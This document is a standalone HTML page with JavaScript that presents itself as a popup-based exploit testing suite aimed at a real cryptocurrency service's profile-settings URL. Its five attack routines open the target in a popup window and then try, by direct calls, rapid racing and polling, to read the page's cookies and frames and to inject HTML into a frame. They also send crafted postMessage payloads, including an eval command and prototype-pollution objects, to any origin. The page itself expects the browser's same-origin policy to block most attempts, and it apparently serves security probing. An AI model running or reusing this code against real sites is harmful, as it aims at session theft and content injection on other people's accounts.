<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Popup Exploit Test - Advanced Attack Vector</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
            line-height: 1.6;
        }
        
        h1 {
            color: #ff0041;
            text-shadow: 0 0 10px #ff0041;
            margin-bottom: 20px;
        }
        
        .section {
            background: #1a1f3a;
            border: 2px solid #00ff41;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
        }
        
        h2 {
            color: #00ff41;
            margin-bottom: 15px;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
        }
        
        button {
            background: #ff0041;
            color: #fff;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
            font-family: 'Courier New', monospace;
        }
        
        button:hover {
            background: #cc0033;
            box-shadow: 0 0 15px #ff0041;
        }
        
        button.success {
            background: #00ff41;
            color: #0a0e27;
        }
        
        button.success:hover {
            background: #00cc33;
        }
        
        input {
            background: #0a0e27;
            color: #00ff41;
            border: 1px solid #00ff41;
            padding: 8px;
            width: 100%;
            margin: 10px 0;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        
        #log {
            background: #000;
            border: 1px solid #00ff41;
            border-radius: 4px;
            padding: 15px;
            max-height: 500px;
            overflow-y: auto;
            margin-top: 10px;
            font-size: 12px;
        }
        
        .log-entry {
            margin-bottom: 8px;
            padding: 5px;
            border-left: 3px solid #00ff41;
            padding-left: 10px;
        }
        
        .log-error {
            border-left-color: #ff0041;
            color: #ff0041;
        }
        
        .log-success {
            border-left-color: #00ff41;
            color: #00ff41;
        }
        
        .log-warning {
            border-left-color: #ffaa00;
            color: #ffaa00;
        }
        
        .log-info {
            border-left-color: #00aaff;
            color: #00aaff;
        }
        
        .code-block {
            background: #000;
            border: 1px solid #00ff41;
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            overflow-x: auto;
        }
        
        .attack-flow {
            background: #1a1f3a;
            padding: 15px;
            border-left: 4px solid #ff0041;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <h1>üöÄ Popup-Based Exploit Test - Advanced Attack Vector</h1>
    
    <div class="section">
        <h2>üìã Attack Methodology</h2>
        <div class="attack-flow">
            <strong>Why Popups Can Bypass iframe Restrictions:</strong>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>‚úÖ No X-Frame-Options blocking (not embedded)</li>
                <li>‚úÖ window.opener maintains reference to attacker page</li>
                <li>‚úÖ Can attempt cross-window scripting</li>
                <li>‚úÖ Timing/race condition attacks possible</li>
                <li>‚úÖ User interaction appears legitimate</li>
            </ul>
        </div>
    </div>

    <div class="section">
        <h2>üéØ Target Configuration</h2>
        <input type="text" id="targetUrl" value="https://test.nicehash.com/my/settings/profile" placeholder="Target URL">
        <div style="margin-top: 10px;">
            <button class="success" onclick="attack1_BasicPopup()">Attack 1: Basic Popup Access</button>
            <button class="success" onclick="attack2_OpenerManipulation()">Attack 2: Opener Manipulation</button>
            <button class="success" onclick="attack3_TimingAttack()">Attack 3: Timing/Race Attack</button>
            <button class="success" onclick="attack4_PollingAttack()">Attack 4: Continuous Polling</button>
            <button class="success" onclick="attack5_PostMessageAbuse()">Attack 5: PostMessage Abuse</button>
            <button onclick="clearLog()">Clear Log</button>
        </div>
    </div>

    <div class="section">
        <h2>üìä Attack Log</h2>
        <div id="log"></div>
    </div>

    <div class="section">
        <h2>üí° Expected Results</h2>
        <div class="code-block">
<strong>MOST LIKELY (Secure):</strong>
‚ùå Same-Origin Policy blocks all access attempts
‚ùå Cannot read popup.document, popup.frames, etc.
Result: Site is secure against popup attacks

<strong>IF VULNERABLE:</strong>
‚úÖ Can access popup.frames[1]
‚úÖ Can read popup.document.cookie
‚úÖ Can inject into popup.frames[1].document
Result: CRITICAL vulnerability - external exploitation possible!
        </div>
    </div>

    <script>
        let targetPopup = null;
        let pollingInterval = null;

        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function clearLog() {
            document.getElementById('log').innerHTML = '';
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        // Attack 1: Basic Popup Access
        function attack1_BasicPopup() {
            const url = document.getElementById('targetUrl').value;
            log('üöÄ ATTACK 1: Basic Popup Access Test', 'warning');
            log(`Opening popup: ${url}`, 'info');
            
            // Open popup
            targetPopup = window.open(url, 'nicehash_target', 'width=1200,height=800');
            
            if (!targetPopup) {
                log('‚ùå Popup blocked by browser! Enable popups and try again.', 'error');
                return;
            }
            
            log('‚úÖ Popup opened successfully', 'success');
            
            // Wait for page to load, then attempt access
            setTimeout(() => {
                log('Attempting to access popup window...', 'info');
                
                // Test 1: Access location
                try {
                    const location = targetPopup.location.href;
                    log(`‚úÖ SUCCESS! Got location: ${location}`, 'success');
                } catch (e) {
                    log(`‚ùå BLOCKED: Cannot access location - ${e.message}`, 'error');
                }
                
                // Test 2: Access document
                try {
                    const doc = targetPopup.document;
                    log(`‚úÖ SUCCESS! Got document: ${doc}`, 'success');
                } catch (e) {
                    log(`‚ùå BLOCKED: Cannot access document - ${e.message}`, 'error');
                }
                
                // Test 3: Access frames
                try {
                    const frameCount = targetPopup.frames.length;
                    log(`‚úÖ SUCCESS! Found ${frameCount} frames`, 'success');
                    
                    // Try to access Frame[1]
                    if (targetPopup.frames[1]) {
                        log('Attempting to access Frame[1]...', 'info');
                        const frame1Doc = targetPopup.frames[1].document;
                        log('‚úÖ CRITICAL! Can access Frame[1].document!', 'success');
                        
                        // Try to inject code
                        targetPopup.frames[1].document.body.innerHTML = '<h1>PWNED FROM POPUP!</h1>';
                        log('‚úÖ CRITICAL! Successfully injected code into Frame[1]!', 'success');
                    }
                } catch (e) {
                    log(`‚ùå BLOCKED: Cannot access frames - ${e.message}`, 'error');
                }
                
                // Test 4: Access cookies
                try {
                    const cookies = targetPopup.document.cookie;
                    log(`‚úÖ CRITICAL! Stolen cookies: ${cookies}`, 'success');
                } catch (e) {
                    log(`‚ùå BLOCKED: Cannot access cookies - ${e.message}`, 'error');
                }
                
                log('--- Attack 1 Complete ---', 'info');
            }, 3000);
        }

        // Attack 2: Opener Manipulation
        function attack2_OpenerManipulation() {
            const url = document.getElementById('targetUrl').value;
            log('üöÄ ATTACK 2: Opener Manipulation', 'warning');
            log('This tests if popup can manipulate attacker page (reverse attack)', 'info');
            
            // Set up listener for messages from popup
            window.addEventListener('message', (e) => {
                log(`üì® Received message from popup: ${JSON.stringify(e.data)}`, 'info');
            });
            
            // Create a trap variable that popup might try to access
            window.attackerData = {
                secret: 'This should not be accessible to popup',
                timestamp: Date.now()
            };
            
            targetPopup = window.open(url, 'nicehash_target2', 'width=1200,height=800');
            
            if (!targetPopup) {
                log('‚ùå Popup blocked!', 'error');
                return;
            }
            
            log('‚úÖ Popup opened', 'success');
            log('Checking if popup can access window.opener...', 'info');
            
            setTimeout(() => {
                // Check if opener reference is blocked
                log('If popup script tried to access window.opener, we would see activity', 'info');
                log('Monitor console for any cross-origin errors', 'warning');
                log('--- Attack 2 Complete ---', 'info');
            }, 3000);
        }

        // Attack 3: Timing/Race Condition Attack
        function attack3_TimingAttack() {
            const url = document.getElementById('targetUrl').value;
            log('üöÄ ATTACK 3: Timing/Race Condition Attack', 'warning');
            log('Attempting rapid-fire access attempts during page load', 'info');
            
            targetPopup = window.open(url, 'nicehash_target3', 'width=1200,height=800');
            
            if (!targetPopup) {
                log('‚ùå Popup blocked!', 'error');
                return;
            }
            
            log('‚úÖ Popup opened', 'success');
            
            // Attempt access every 100ms for 5 seconds
            let attempts = 0;
            const maxAttempts = 50;
            
            const racingInterval = setInterval(() => {
                attempts++;
                
                try {
                    // Try to access during page load
                    const frames = targetPopup.frames;
                    if (frames && frames[1]) {
                        const doc = frames[1].document;
                        log(`‚úÖ RACE CONDITION SUCCESS! Accessed Frame[1] on attempt ${attempts}`, 'success');
                        clearInterval(racingInterval);
                        return;
                    }
                } catch (e) {
                    // Silent fail - expected
                }
                
                if (attempts >= maxAttempts) {
                    clearInterval(racingInterval);
                    log(`‚ùå All ${maxAttempts} timing attempts failed`, 'error');
                    log('--- Attack 3 Complete ---', 'info');
                }
            }, 100);
        }

        // Attack 4: Continuous Polling
        function attack4_PollingAttack() {
            const url = document.getElementById('targetUrl').value;
            log('üöÄ ATTACK 4: Continuous Polling Attack', 'warning');
            log('Continuously monitoring popup for access opportunities', 'info');
            
            targetPopup = window.open(url, 'nicehash_target4', 'width=1200,height=800');
            
            if (!targetPopup) {
                log('‚ùå Popup blocked!', 'error');
                return;
            }
            
            log('‚úÖ Popup opened - starting continuous monitoring', 'success');
            log('‚ö†Ô∏è This will run for 30 seconds. Click "Clear Log" to stop.', 'warning');
            
            let pollCount = 0;
            const startTime = Date.now();
            
            pollingInterval = setInterval(() => {
                pollCount++;
                
                // Stop after 30 seconds
                if (Date.now() - startTime > 30000) {
                    clearInterval(pollingInterval);
                    log(`Polling stopped after ${pollCount} attempts`, 'info');
                    log('--- Attack 4 Complete ---', 'info');
                    return;
                }
                
                // Try multiple access patterns
                try {
                    // Pattern 1: Direct frame access
                    if (targetPopup.frames[1]) {
                        targetPopup.frames[1].document;
                        log(`‚úÖ BREAKTHROUGH! Frame access succeeded on poll ${pollCount}`, 'success');
                        clearInterval(pollingInterval);
                    }
                } catch (e) {}
                
                try {
                    // Pattern 2: Cookie access
                    const cookies = targetPopup.document.cookie;
                    if (cookies) {
                        log(`‚úÖ BREAKTHROUGH! Cookie access succeeded: ${cookies}`, 'success');
                        clearInterval(pollingInterval);
                    }
                } catch (e) {}
                
                try {
                    // Pattern 3: Location access
                    const loc = targetPopup.location.href;
                    if (loc && !loc.includes('about:blank')) {
                        log(`‚úÖ Got location on poll ${pollCount}: ${loc}`, 'success');
                    }
                } catch (e) {}
                
                // Log every 10th poll
                if (pollCount % 10 === 0) {
                    log(`Polling... attempt ${pollCount}`, 'info');
                }
            }, 200);
        }

        // Attack 5: PostMessage Abuse
        function attack5_PostMessageAbuse() {
            const url = document.getElementById('targetUrl').value;
            log('üöÄ ATTACK 5: PostMessage Abuse', 'warning');
            log('Sending crafted postMessages to popup', 'info');
            
            targetPopup = window.open(url, 'nicehash_target5', 'width=1200,height=800');
            
            if (!targetPopup) {
                log('‚ùå Popup blocked!', 'error');
                return;
            }
            
            log('‚úÖ Popup opened', 'success');
            
            // Listen for responses
            window.addEventListener('message', (e) => {
                log(`üì® Received response: Origin=${e.origin}`, 'success');
                log(`   Data: ${JSON.stringify(e.data)}`, 'info');
            });
            
            // Wait for page load, then spam messages
            setTimeout(() => {
                log('Sending crafted postMessages...', 'info');
                
                const exploits = [
                    {type: 'channelConnect'},
                    {type: 'execute'},
                    {type: 'recaptcha-setup'},
                    {method: 'constructor', data: 'exploit'},
                    {cmd: 'eval', code: 'alert(1)'},
                    ['Bexploit', 'x', 'popup_attack'],
                    {__proto__: {isAdmin: true}},
                    {type: 'POSTMESSAGE_TRACKER_DATA', detail: {malicious: true}}
                ];
                
                exploits.forEach((payload, i) => {
                    setTimeout(() => {
                        log(`Sending payload ${i + 1}: ${JSON.stringify(payload).substring(0, 50)}...`, 'info');
                        targetPopup.postMessage(payload, '*');
                    }, i * 300);
                });
                
                log('All payloads sent - watch for responses', 'warning');
                log('--- Attack 5 Complete (monitoring for responses) ---', 'info');
            }, 3000);
        }

        // Initial instructions
        window.onload = () => {
            log('üéØ Popup-Based Exploit Testing Suite Loaded', 'success');
            log('', 'info');
            log('‚ö†Ô∏è IMPORTANT: Make sure popups are ENABLED in your browser!', 'warning');
            log('', 'info');
            log('Click any "Attack" button to begin testing', 'info');
            log('', 'info');
            log('üí° TIP: Attack 1 is the most comprehensive - start there!', 'info');
        };
    </script>
</body>
</html>
